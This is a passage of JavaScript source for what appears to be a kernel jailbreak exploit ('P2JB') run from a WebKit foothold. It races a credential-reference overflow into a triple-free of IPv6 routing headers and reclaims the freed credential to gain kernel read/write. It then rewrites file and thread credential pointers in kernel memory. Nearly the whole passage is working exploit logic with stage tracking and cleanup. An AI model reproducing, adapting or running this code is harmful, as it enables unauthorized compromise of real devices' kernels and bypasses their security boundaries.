                    } finally {
                        if (this.pool.recv.inFlight && !recvState)
                            recvState = { fed: false, waited: false, unsafe: false };
                    }
                };
                const feedRecv = () => {
                    if (!recvState || recvState.fed)
                        throw new Error("P2JB recv gate state is invalid");
                    try { this.unblockRecvWorkers(); }
                    catch (error) { recvState.unsafe = true; throw error; }
                    recvState.fed = true;
                };
                const finishRecv = () => {
                    if (!recvState || !recvState.fed || recvState.waited)
                        throw new Error("P2JB recv completion state is invalid");
                    try { this.pool.recv.wait(); }
                    catch (error) { recvState.unsafe = true; throw error; }
                    recvState.waited = true;
                    try { this.drainRecvWorkers(); }
                    catch (error) { recvState.unsafe = true; throw error; }
                    recvState = null;
                };
                const releaseRecv = () => { feedRecv(); finishRecv(); };
                const recoverRecv = () => {
                    if (!recvState && this.pool.recv.inFlight)
                        recvState = { fed: false, waited: false, unsafe: false };
                    if (!recvState) return;
                    if (recvState.unsafe)
                        throw new Error("P2JB recv worker state became ambiguous");
                    if (!recvState.fed) feedRecv();
                    if (!recvState.waited) finishRecv();
                };
                try {
                    if (this.freeFdIdx + 3 > this.freeFds.length)
                        throw new Error("P2JB free-fd pool exhausted");
                    for (const fd of this.ipv6) this.freeRthdr(fd);
                    this.crfreeOverflow("initial");
                    for (let index = 0; index < this.t.reclaimCycles; ++index) {
                        dispatchRecv();
                        this.yield();
                        releaseRecv();
                    }
                    this.crfreeOverflow("double");
                    this.findTwins();
                    this.freeRthdr(this.ipv6[this.twins[1]]);
                    this.yield();
                    this.yield();

                    let reclaimed = false;
                    for (let index = 0; index < this.t.maxInnerIterations; ++index) {
                        dispatchRecv();
                        this.yield();
                        this.buffers.leak.put32(0, 0);
                        this.buffers.leak.put32(4, 0);
                        const observation = this.getRthdr(
                            this.ipv6[this.twins[0]], 8);
                        if (observation.ok && this.buffers.leak.get32(0) === 1) {
                            reclaimed = true;
                            break;
                        }
                        releaseRecv();
                    }
                    if (!reclaimed)
                        throw new Error("recvmsg did not reclaim the overflowed ucred");

                    this.triplets[0] = this.twins[0];
                    this.crfreeOverflow("triple");
                    this.yield();
                    this.triplets[1] = this.findTriplet(this.triplets[0], -1);
                    feedRecv();
                    if (this.triplets[1] < 0) {
                        finishRecv();
                        throw new Error("second routing-header alias missing");
                    }
                    this.yield();
                    this.triplets[2] = this.findTriplet(
                        this.triplets[0], this.triplets[1]);
                    finishRecv();
                    if (this.triplets[2] < 0)
                        throw new Error("third routing-header alias missing");
                    this.transition(NS.KernelStage.TRIPLE_FREE);
                    this.markProgress("P2JB-TRIPLE-FREE", `attempt=${attempt + 1}`);
                    await delay(this.p2.postRaceSettleMs);
                    return;
                } catch (error) {
                    try { recoverRecv(); }
                    catch (recoveryError) {
                        throw new Error(`P2JB recv worker recovery failed: `
                            + `${error.message}; ${recoveryError.message}`);
                    }
                    lastError = error;
                    if (attempt === 0 || (attempt + 1) % 8 === 0) {
                        this.markProgress("P2JB-RACE-RETRY",
                            `attempt=${attempt + 1} error=${error.message}`);
                    }
                    await delay(10);
                }
            }
            throw new Error(`P2JB triple-free failed after`
                + ` ${attemptLimit} attempts: ${lastError?.message}`);
        }

        async preflight() {
            if (this.p2jbPreflightResult)
                return this.p2jbPreflightResult;
            if (this.p2jbPreflightPromise)
                return this.p2jbPreflightPromise;
            this.p2jbPreflightPromise = (async () => {
                // Exercise the firmware-specific WebKit gadget before the
                // first credential leak.  This validates opaque/reference-
                // derived text semantically while the kernel is still clean.
                this.verifyCounterGadget();
                const burnCores = this.selectBurnCores();
                this.verifyBurnCoreAffinity(burnCores);
                const limits = this.raiseFdLimit();
                const factory = this.fdFactory();
                const budget = await this.probeFdBudget(factory);
                this.markProgress("P2JB-FD-PROBE",
                    `soft=${limits.after.toHex()} probed=${budget.probed}`
                    + ` usable=${budget.usable} capped=${budget.capped}`
                    + ` cores=${burnCores.join(",")}`);
                const result = { burnCores, limits, factory, budget };
                this.p2jbPreflightResult = result;
                return result;
            })();
            try {
                return await this.p2jbPreflightPromise;
            } finally {
                this.p2jbPreflightPromise = null;
            }
        }

        async triggerP2jb() {
            const { burnCores, factory, budget } = await this.preflight();

            // setuid(1) is the reference port's irreversible boundary. Record
            // it before the call so any failure from here requires a fresh boot.
            this.markDirty("p2jb-setuid-start");
            this.dirty = true;
            this.rebootRequired = true;
            this.transition(NS.KernelStage.DIRTY);
            this.checkedSetuid("PRE-LEAK");
            await delay(this.p2.settleDelayMs);

            // Do not issue a "probe" kqueueex call here: even an EFAULT return
            // leaks one credential reference and would make the exact overflow
            // arithmetic off by one.  The first leaking call belongs to the
            // counted worker plan below.
            this.markProgress("P2JB-BEGIN");
            await this.burnCredentialReferences(budget.usable, burnCores);

            this.freeFds = [];
            for (let index = 0; index < budget.usable; ++index) {
                const fd = factory();
                if (fd < 0) break;
                this.freeFds.push(fd);
            }
            this.freeFdIdx = 0;
            if (this.freeFds.length !== budget.usable)
                throw new Error(`P2JB free-fd pool ${this.freeFds.length}`
                    + `/${budget.usable}`);
            this.checkedSetuid("POST-LEAK");
            await delay(this.p2.settleDelayMs);
            await this.overflowRace();
        }

        captureStaleCredential() {
            if (this.freeFdIdx >= this.freeFds.length)
                throw new Error("P2JB has no live free-fd credential sample");
            const file = this.fget(this.freeFds[this.freeFdIdx]);
            if (!file.isKernelPointer())
                throw new Error("P2JB stale-credential sample has no file");
            const credential = this.read64(file.add32(this.p2off("fileCred")));
            if (!credential.isKernelPointer())
                throw new Error("P2JB stale credential is not a kernel pointer");
            this.staleCredential = credential;
            return credential;
        }

        closeChecked(fd, label) {
            const result = this.callI32("native.exports.close", [fd]);
            if (result !== 0) throw new Error(`${label} close(${fd})=${result}`);
        }

        discoverProcessSeed() {
            let pair = null;
            try {
                pair = this.createPipePair("p2jb-sigio");
                const pid = this.callI32("native.exports.getpid", []);
                if (!Number.isInteger(pid) || pid <= 1)
                    throw new Error(`P2JB getpid returned ${pid}`);
                const owner = this.alloc(4, 4, "p2jb-sigio-owner");
                owner.put32(0, pid);
                const result = this.callI32("native.exports.ioctl",
                    [pair[0], this.c.fiosetown, owner.address]);
                if (result !== 0) throw new Error(`P2JB FIOSETOWN failed ${result}`);
                const file = this.fget(pair[0]);
                const pipe = file.isKernelPointer()
                    ? this.read64(file.add32(this.p2off("fileData"))) : U64.zero();
                const sigio = pipe.isKernelPointer()
                    ? this.read64(pipe.add32(this.off("kernel.structures.pipeSigio")))
                    : U64.zero();
                const curproc = sigio.isKernelPointer()
                    ? this.read64(sigio) : U64.zero();
                if (!curproc.isKernelPointer())
                    throw new Error("P2JB SIGIO did not expose curproc");
                const actualPid = this.read32(curproc.add32(
                    this.off("kernel.structures.procPid"))) | 0;
                if (actualPid !== pid)
                    throw new Error(`P2JB curproc PID ${actualPid}/${pid}`);
                const procUcred = this.read64(curproc.add32(
                    this.off("kernel.structures.procUcred")));
                const procFd = this.read64(curproc.add32(
                    this.off("kernel.structures.procFd")));
                if (!procUcred.isKernelPointer() || !procFd.isKernelPointer())
                    throw new Error("P2JB curproc pointers are invalid");
                return { pid, curproc, procUcred, procFd };
            } finally {
                if (pair) {
                    for (const fd of [pair[1], pair[0]]) {
                        try { this.callI32("native.exports.close", [fd]); } catch {}
                    }
                }
            }
        }

        async stabilizeRace() {
            if (!this.fast || !this.fastValidated
                || this.stage !== NS.KernelStage.FAST_RW)
                throw new Error("P2JB stabilization requires validated fast kernel R/W");
            const pipeHolds = [...this.master, ...this.victim];
            if (new Set(pipeHolds).size !== this.p2.cleanupPipeHolds
                    || pipeHolds.some((fd) => !Number.isInteger(fd) || fd < 0))
                throw new Error(`P2JB pipe-hold geometry ${new Set(pipeHolds).size}`
                    + `/${this.p2.cleanupPipeHolds}`);
            if (this.ipv6.length !== this.p2.ipv6Sockets)
                throw new Error(`P2JB IPv6 cleanup geometry ${this.ipv6.length}`
                    + `/${this.p2.ipv6Sockets}`);
            const workerDescriptors = [...this.iovSockets, ...this.uioSockets];
            if (new Set(workerDescriptors).size
                    !== this.p2.cleanupWorkerDescriptors
                    || workerDescriptors.some((fd) =>
                        !Number.isInteger(fd) || fd < 0))
                throw new Error(`P2JB worker descriptor geometry `
                    + `${new Set(workerDescriptors).size}`
                    + `/${this.p2.cleanupWorkerDescriptors}`);

            for (const fd of pipeHolds)
                this.holdFile(fd);

            for (const fd of this.ipv6) this.removeRthdr(fd);
            this.captureStaleCredential();
            for (let index = this.freeFdIdx; index < this.freeFds.length; ++index)
                this.closeChecked(this.freeFds[index], "P2JB free-fd");
            for (const fd of this.ipv6) this.closeChecked(fd, "P2JB IPv6");
            for (const fd of workerDescriptors)
                this.closeChecked(fd, "P2JB worker socketpair");

            const parked = this.pool.retainParked();
            if (parked !== this.p2.cleanupParkedWorkers)
                throw new Error(`P2JB parked worker geometry ${parked}`
                    + `/${this.p2.cleanupParkedWorkers}`);
            this.markProgress("P2JB-RACE-CLEANUP",
                `workers=${parked} settling=3000ms`);
            await delay(3000);
            this.processSeed = this.discoverProcessSeed();
            this.resourcePolicy.expectedParkedWorkers = parked;
            this.transition(NS.KernelStage.STABLE);
            this.raceStabilized = true;
            this.markProgress("P2JB-RACE-STABILIZED",
                `workers=${parked} curproc=${this.processSeed.curproc.toHex()}`);
            return this;
        }

        deepCleanup() {
            throw new Error("P2JB uses stabilizeRace, not POOPS deep cleanup");
        }

        collectCredentialTargets(credential) {
            const targets = new Map();
            const nfiles = this.read32(this.fdtOfiles.sub(
                this.p2off("fdescenttblHeader"))) >>> 0;
            if (!nfiles || nfiles > 0x10000)
                throw new Error(`P2JB fd table size is invalid: ${nfiles}`);
            const stride = this.off("kernel.structures.filedescentSize");
            for (let fd = 0; fd < nfiles; ++fd) {
                const file = this.read64(this.fdtOfiles.add32(fd * stride));
                if (!file.isKernelPointer()) continue;
                const slot = file.add32(this.p2off("fileCred"));
                const value = this.read64(slot);
                if (!value.isKernelPointer() || value.eq(credential)) continue;
                targets.set(slot.toHex(), { kind: "file", address: slot,
                    before: value, fd });
            }

            let thread = this.read64(this.processSeed.curproc.add32(
                this.p2off("procThreads")));
            const seen = new Set();
            for (let count = 0; !thread.isZero() && count < 500; ++count) {
                if (!thread.isKernelPointer() || seen.has(thread.toHex()))
                    throw new Error("P2JB thread list is corrupt or cyclic");
                seen.add(thread.toHex());
                const owner = this.read64(thread.add32(this.p2off("threadProc")));
                if (!owner.eq(this.processSeed.curproc))
                    throw new Error("P2JB thread td_proc mismatch");
                const slot = thread.add32(this.p2off("threadUcred"));
                const value = this.read64(slot);
                if (value.isKernelPointer() && !value.eq(credential))
                    targets.set(slot.toHex(), { kind: "thread", address: slot,
                        before: value, thread });
                thread = this.read64(thread.add32(this.p2off("threadNext")));
            }
            if (!thread.isZero())
                throw new Error("P2JB thread walk exceeded its bound");
            return { nfiles, targets: Array.from(targets.values()) };
        }

        seal() {
            if (this.sealed) return this.sealResult;
            if (!this.raceStabilized || this.stage !== NS.KernelStage.STABLE
                || !this.fast || !this.fastValidated)
                throw new Error("P2JB seal requires stabilized fast kernel R/W");
            try {
                const current = this.processSeed.procUcred;
                if (!current.isKernelPointer())
                    throw new Error("P2JB current credential is invalid");
                const inventory = this.collectCredentialTargets(current);
                const count = inventory.targets.length;
                const referenceSlot = current.add32(this.p2off("ucredRef"));
                const refs = this.read32(referenceSlot) >>> 0;
                if (!refs || refs > 0xffffffff - count)
                    throw new Error(`P2JB current credential refcount ${refs}`);
                if (count) {
                    this.write32(referenceSlot, refs + count);
                    const observed = this.read32(referenceSlot) >>> 0;
                    if (observed < refs + count)
                        throw new Error("P2JB current credential refcount did not rise");
                }
                for (const target of inventory.targets) {
                    this.write64(target.address, current);
                    if (!this.read64(target.address).eq(current))
                        throw new Error(`P2JB ${target.kind} credential migration failed`);
                }

                if (!this.staleCredential.isKernelPointer()
                    || this.staleCredential.eq(current))
                    throw new Error("P2JB stale credential cannot be pinned");
                const ucredSize = this.off("kernel.constants.ucredSize");
                const clone = this.read(current, ucredSize);
                writeU32LE(clone, 0, 0x10000000);
                this.write(this.staleCredential, clone);
                const cloned = this.read(this.staleCredential, ucredSize);
                for (let index = 0; index < clone.length; ++index) {
                    if (clone[index] !== cloned[index])
                        throw new Error(`P2JB stale credential clone mismatch +0x${index.toString(16)}`);
                }

                const masterFile = this.fget(this.master[0]);
                const masterData = masterFile.isKernelPointer()
                    ? this.read64(masterFile.add32(this.p2off("fileData")))
                    : U64.zero();
                if (!masterData.isKernelPointer())
                    throw new Error("P2JB master pipe data is invalid at seal");
                const bufferSlot = masterData.add32(this.p2off("pipeBuffer"));
                const priorBuffer = this.read64(bufferSlot);
                if (!priorBuffer.isKernelPointer())
                    throw new Error("P2JB master pipe buffer is not redirected");

                // This is deliberately the final kernel access: nulling the
                // master backing pointer destroys the fast R/W transport.
                this.write64(bufferSlot, 0);
                this.fast = false;
                this.fastValidated = false;
                const restoreWarnings = this.restoreMainThread();
                if (restoreWarnings.length)
                    throw new Error(`P2JB scheduling restore: ${restoreWarnings.join("; ")}`);

                const parked = this.pool.liveWorkerCount();
                if (!this.pool.retained
                    || parked !== this.resourcePolicy.expectedParkedWorkers)
                    throw new Error(`P2JB parked worker count ${parked}`);
                this.sealed = true;
                this.dirty = false;
                this.rebootRequired = false;
                this.resourcePolicy.closeSafe = true;
                this.sealResult = Object.freeze({
                    nfiles: inventory.nfiles,
                    migratedCredentials: count,
                    parkedWorkers: parked,
                    staleCredential: this.staleCredential.toHex(),
                    currentCredential: current.toHex(),
                    priorPipeBuffer: priorBuffer.toHex()
                });
                this.markProgress("P2JB-SEALED",
                    `migrated=${count} workers=${parked}`);
                return this.sealResult;
            } catch (error) {
                this.rebootRequired = true;
                throw error;
            }
        }

        async dirtyFailureCleanup() {
            const warnings = [];
            if (this.burnWorkers) {
                const group = this.burnWorkers;
                try { warnings.push(...await group.abort()); }
                catch (error) { warnings.push(error.message); }
                if (group.stopped) this.burnWorkers = null;
            }
            try { warnings.push(...this.restoreMainThread()); }
            catch (error) { warnings.push(error.message); }
            return warnings;
        }

        async run() {
            try {
                this.prepare();
                await this.triggerP2jb();
                this.reclaimKqueue();
                this.transition(NS.KernelStage.SLOW_RW);
                this.promoteFastRw();
                await this.stabilizeRace();
                return this;
            } catch (cause) {
                this.markProgress("P2JB-ERROR", `stage=${this.stage}`
                    + ` dirty=${this.dirty} error=${cause.message}`);
                let warnings = [];
                try {
                    warnings = this.dirty
                        ? await this.dirtyFailureCleanup() : this.safeCleanup();
                } catch (error) {
                    warnings.push(error.message);
                }
                if (this.dirty) this.rebootRequired = true;
                const message = warnings.length
                    ? `${cause.message}; cleanup warnings: ${warnings.join("; ")}`
                    : cause.message;
                throw new NS.KernelExploitError(message, this.stage, cause);
            }
        }
    }

    NS.P2jbBurnPlan = P2jbBurnPlan;
    NS.P2jbStagedBuffer = P2jbStagedBuffer;
    NS.P2jbBurnWorker = P2jbBurnWorker;
    NS.P2jbBurnGroup = P2jbBurnGroup;
    NS.P2jbBurnStatus = Object.freeze({ waiting: STATUS_WAITING,
        busy: STATUS_BUSY, exited: STATUS_EXITED, aborted: STATUS_ABORTED });
    NS.P2jbKernel = P2jbKernel;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { P2jbBurnPlan, P2jbStagedBuffer, P2jbBurnWorker,
            P2jbBurnGroup, P2jbKernel, P2jbBurnStatus: NS.P2jbBurnStatus };
})(typeof globalThis !== "undefined" ? globalThis : this);
